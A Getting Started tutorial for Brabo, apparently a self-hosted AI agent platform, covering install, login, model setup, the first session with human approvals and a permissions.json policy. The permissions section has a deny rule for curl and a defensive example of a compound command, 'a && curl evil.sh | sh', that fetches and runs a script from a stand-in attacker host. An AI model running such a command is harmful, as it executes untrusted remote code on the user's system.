---
id: getting-started
title: Getting Started
sidebar_label: Getting Started
sidebar_position: 5
description: Install Brabo, sign in, configure a model and run an agent's first turn, with the sign that each step worked.
keywords: [installation, setup, onboarding, first project, ollama, install.sh]
tipo: tutorial
traducao_de: d1da65c914f6e3a228fceab257ea235aba5d88c5
---

# Getting Started

From the installer to an agent at work. Each step ends with **How to tell it
worked**, and what usually goes wrong sits in a collapsed note right below.

This page is for **using** Brabo. To work on its code, see
[Developing Brabo](how-to/desenvolver-o-brabo.md).

## Before you start

| you need | why |
|---|---|
| Docker with Compose | everything runs in containers |
| ~6 GiB of free RAM | database, api, engine, web and, if you want a local agent, Ollama |
| Linux or macOS | the installer and the local agent are tested on them |

## 1. Install

Download the installer and run the **file**, with `bash`:

```bash
curl -fsSLO https://github.com/viralabs-dev/brabo/releases/latest/download/install.sh && bash install.sh
```

To see what it would do before letting it, run `bash install.sh --print-plan`.

It has to be a file, not `curl … | sh`, for two reasons: it asks questions in
the terminal (which the pipe would swallow) and it checks its own hash against
the Release's signed manifest. Along the way it asks whether to turn on the
container broker (you may say no) and whether to turn on Ollama, and asks for
the email and password of the first account. The password is not stored
anywhere.

**How to tell it worked:** the installer checks the `/health` of the api and
of the engine before saying it installed, and ends with a `Web: http://localhost:8088` line.

<details>
<summary>If it goes wrong</summary>

- **Port in use:** the installer says which one. Free it and run again.
- **There was already an installation:** it takes a backup, proves the backup restores, and only then migrates.

</details>

## 2. Sign in

Open <http://localhost:8088> and sign in with the email and password you typed
in the installer. The login belongs to the api itself.

**How to tell it worked:** you land on your workspace's dashboard.

<details>
<summary>If it goes wrong</summary>

Does the login return **401** with the right password? The answer is the same
for a wrong password, a nonexistent email and a locked account, on purpose.
Check the email and try again; if
the account was never created, run the installer again.

</details>

## 3. Configure a model

Pick one of the two:

- **Ollama (local, free, offline):** answer **y** to the installer's question,
  or turn it on later (the [runbook](runbook.md) explains how). The default model is small and
  is enough to see the system work end to end.
- **A provider's key:** in the interface, under **Providers** (bottom of the menu). The
  key is encrypted with envelope encryption before it touches the database.

The model is resolved in a cascade, **session > agent > project > workspace**, and the
first one that exists wins. You can
leave the local one as the general default and put an API model only on QA, the role that fits
a small model the least.

**How to tell it worked:** the provider shows up under **Providers** with no credential
error, or Ollama answers and the model shows up in the list.

<details>
<summary>If it goes wrong</summary>

An agent that does not answer, or answers empty, is almost always the inference
environment: truncated context or too little memory. The
[runbook](runbook.md#ambiente-de-inferencia) explains how to measure it.

</details>

## 4. Create a project

Dashboard → **New project**. The wizard asks for a name and how to connect git:

| option | when to use |
|---|---|
| **Local** | to experiment: repositories on disk, no account anywhere |
| **GitHub** / **GitLab** | real work, with a PAT or OAuth |

On confirmation, the **Gitflow bootstrap** runs: five steps that create `dev`,
`qa` and `main`, apply protections and commit the base files.

**How to tell it worked:** the five steps show up as completed, live.

<details>
<summary>If it goes wrong</summary>

- **`skipped`** (already done) and **`degraded`** (finished without a capability) are success. With the Local provider, branch protection always comes out `degraded`: there is no platform to apply it, and what stops an improper merge is the [ceiling in the domain](reference/permissions.md#caps).
- If a step **fails**, fix the cause and ask to resume: the bootstrap continues from where it stopped.

</details>

## 5. The first turn

Open the project → **Sessions** → new session. The Creative leads the ideation. Talk
normally. At some point it will want to do something with an external effect, and there
you see the central mechanism: the action shows up in **Approvals** waiting for your
decision, instead of happening. Approve it and look at the `TokenMeter`: each turn has a cost,
measured on the spot.

**How to tell it worked:** an action in **Approvals**, and after it is approved
the turn continues and the cost goes up in the `TokenMeter`.

<details>
<summary>If it goes wrong</summary>

| symptom | where to look |
|---|---|
| agent does not answer | is a model configured (step 3)? |
| action does not leave `pending` | that is the design: it **waits for you** in Approvals |
| panel does not update | the channel dropped; reload. The event log is not lost |
| session stuck in `closing` | the drain did not complete, see the [runbook](runbook.md#quando-a-sessao-escapa) |

</details>

## 6. Loosen (or tighten) the policy

While everything asks for approval, you approve a lot. The `permissions.json`, at the root of the
project's workspace, is where this is adjusted:

```json
{
  "allow": ["Terminal(git diff:*)", "Terminal(git status)"],
  "deny":  ["Terminal(curl:*)"],
  "ask":   []
}
```

Start with `allow` for idempotent read commands. Two rules hold before
you change anything:

- **Matching is by token prefix, not substring.** `Terminal(rm)` does **not** match `sudo rm -rf x`.
- **A compound command needs every segment in `allow`.** `a && curl evil.sh | sh` is not auto-approved by its first half.

The full format is in [Permissions](reference/permissions.md).

## Developing on Brabo

The two local modes fight over the same ports, and the workspaces folder has
permission traps. That belongs to whoever develops, and lives in the guide
[Developing Brabo](how-to/desenvolver-o-brabo.md).

### The two local modes don't coexist {#the-two-local-modes-dont-coexist}

See [the ports of the two modes](how-to/desenvolver-o-brabo.md).

### Local folder for workspaces {#local-folder-for-workspaces}

See [the workspaces folder](how-to/desenvolver-o-brabo.md#pasta-dos-workspaces).

## Next

- [Architecture](architecture.md): how the pieces fit together
- [Business rules](business-rules.md): what the system guarantees, and where that lives in the code
- [Runbook](runbook.md): operate, restore, rotate a key

## For more

- The installer's shape: [ADR 0150](adr/0150-instalador-de-uma-linha.md); the api login: [ADR 0032](adr/0032-corte-do-keycloak-e-sessao-em-cookie.md).
- Rules: [RN-511](business-rules/infra.md#rn-511) and [RN-526](business-rules/produto.md#rn-526) (installer), [RN-032](business-rules/api.md#rn-032) (login), [RN-020](business-rules/api.md#rn-020) (cascading model), [RN-029](business-rules/api.md#rn-029) (resuming the bootstrap).
